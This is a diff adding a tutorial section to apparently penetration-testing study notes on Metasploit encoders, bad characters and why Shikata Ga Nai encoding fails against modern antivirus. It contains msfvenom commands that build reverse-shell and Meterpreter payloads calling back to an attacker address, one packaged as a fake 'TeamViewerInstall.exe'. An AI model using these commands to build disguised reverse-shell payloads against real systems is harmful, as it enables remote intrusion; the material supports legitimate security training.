@@ -456,3 +456,121 @@ Server username: NT AUTHORITY\SYSTEM
 |`windows/x64/meterpreter/reverse_https`|x64|**Staged (Encrypted)**|Meters communication over TLS/HTTPS (bypasses basic DPI firewalls).|
 |`windows/x64/powershell_reverse_tcp`|x64|**Single (Inline)**|Interactive PowerShell execution session.|
 |`windows/x64/vncinject/reverse_tcp`|x64|**Staged**|Reflective VNC DLL injection granting GUI remote desktop access.|
+
+---
+
+# Metasploit Encoders, Bad Characters, & AV Evasion Realities
+
+## Overview
+
+In the Metasploit Framework, **Encoders** modify payload shellcode to eliminate restricted bytes (**bad characters**) that break exploit buffer execution, while adapting payloads across processor architectures (`x86`, `x64`, `sparc`, `ppc`, `mips`).
+
+Historically, polymorphic encoders like **`x86/shikata_ga_nai`** (SGN) were heavily leveraged to bypass signature-based Antivirus (AV) solutions. In modern offensive security, static signatures, heuristic scanners, and EDR behavioral analysis easily detect standard Metasploit encoder stubs.
+
+```
+[ Raw Shellcode ] ──> [ Encoder (-e) / Bad Char Filter (-b) ] ──> [ Decoder Stub + Encoded Payload ]
+```
+
+## 1. Primary Functions of Encoders
+
+```
+                                  ┌──────────────────────────────────────────────┐
+                                  │          Core Purposes of Encoders           │
+                                  └──────────────────────┬───────────────────────┘
+                                                         │
+         ┌───────────────────────────────────────────────┼───────────────────────────────────────────────┐
+         ▼                                               ▼                                               ▼
++--------------------------------+              +--------------------------------+              +--------------------------------+
+|     Bad Character Removal      |              |   Architecture Compatibility   |              |   Format & Packaging Bounds    |
+| Strips `\x00` (null bytes),    |              | Translates shellcode to match  |              | Formats payloads for Perl, C,  |
+| CR/LF (`\x0d`, `\x0a`), etc.   |              | x86, x64, MIPS, or SPARC.      |              | Python, Raw, or EXE execution. |
++--------------------------------+              +--------------------------------+              +--------------------------------+
+```
+
+### Why Bad Characters Matter
+
+During memory corruption (such as stack buffer overflows or string formatting flaws), the target application interprets specific bytes as terminators:
+
+- `\x00` (Null Byte): Terminates C-style strings, truncating shellcode injection.
+    
+- `\x0a` / `\x0d` (Newline / Carriage Return): Terminates network protocol commands (HTTP, FTP, SMTP).
+    
+- Specifying `-b "\x00\x0a\x0d"` forces `msfvenom` to route through compatible encoders that substitute these opcodes.
+    
+
+## 2. Legacy vs. Modern Workflow
+
+- **Legacy Tooling (Pre-2015):** Generation and encoding were separated into standalone binaries (`msfpayload` piped into `msfencode`).
+    
+- **Modern Tooling (`msfvenom`):** Combines generation, formatting, and iterative encoding into a unified CLI binary.
+    
+
+```bash
+# Modern Single-Command Syntax
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -b "\x00" -e x86/shikata_ga_nai -f perl
+```
+
+## 3. The Myth of AV Evasion with Shikata Ga Nai
+
+**Shikata Ga Nai (SGN - 仕方がない)** is a polymorphic XOR additive feedback encoder. While it dynamically varies instruction ordering and decoder registers on each generation, the **decoder stub itself** has a well-known signature cataloged by every major AV and EDR vendor.
+
+### Multi-Iteration Myth (`-i 10`)
+
+Increasing iteration rounds (e.g., `-i 10`) wraps the payload inside multiple layers of decoder stubs. While this alters the hash and internal shellcode pattern, it does **not** bypass modern defenses.
+
+```bash
+# Generating an executable with 10 encoding iterations
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o TeamViewerInstall.exe
+```
+
+### VirusTotal Analysis Output (`msf-virustotal`)
+
+Submitting standard encoded MSF binaries to multi-engine scanners demonstrates near-universal detection:
+
+```bash
+enamto@htb[/htb]$ msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
+
+[*] Analysis Report: TeamViewerInstall.exe (51 / 68 Engines Flagged Malicious)
+=============================================================================
+ Antivirus          Detected   Result
+ ---------          --------   ------
+ Microsoft          true       Trojan:Win32/Meterpreter.A
+ CrowdStrike        true       win/malicious_confidence_100%
+ Kaspersky          true       HEUR:Trojan.Win32.Generic
+ SentinelOne        true       Static AI - Malicious PE
+ Sophos             true       ML/PE-A + Mal/EncPk-ACE
+```
+
+## 4. Querying & Selecting Compatible Encoders
+
+Inside `msfconsole`, running `show encoders` while inside an exploit module filters encoders compatible with the selected target architecture.
+
+```bash
+# Display compatible 64-bit encoders
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
+
+Compatible Encoders
+===================
+   #  Name              Rank    Description
+   -  ----              ----    -----------
+   0  generic/eicar     manual  The EICAR Encoder
+   1  generic/none      manual  The "none" Encoder
+   2  x64/xor           manual  XOR Encoder
+   3  x64/xor_dynamic   manual  Dynamic key XOR Encoder
+   4  x64/zutto_dekiru  manual  Zutto Dekiru
+```
+
+### Common Encoders Reference
+
+|**Encoder Name**|**Architecture**|**Rank**|**Mechanism / Notes**|
+|---|---|---|---|
+|`x86/shikata_ga_nai`|x86 (32-bit)|Excellent|Polymorphic XOR additive feedback.|
+|`x86/alpha_mixed`|x86 (32-bit)|Low|Alphanumeric mixed-case printable ASCII encoder.|
+|`x64/zutto_dekiru`|x64 (64-bit)|Manual|Dynamic block-based polymorphic 64-bit XOR encoder.|
+|`generic/none`|Multi|Normal|Skips encoding; outputs raw shellcode untouched.|
+
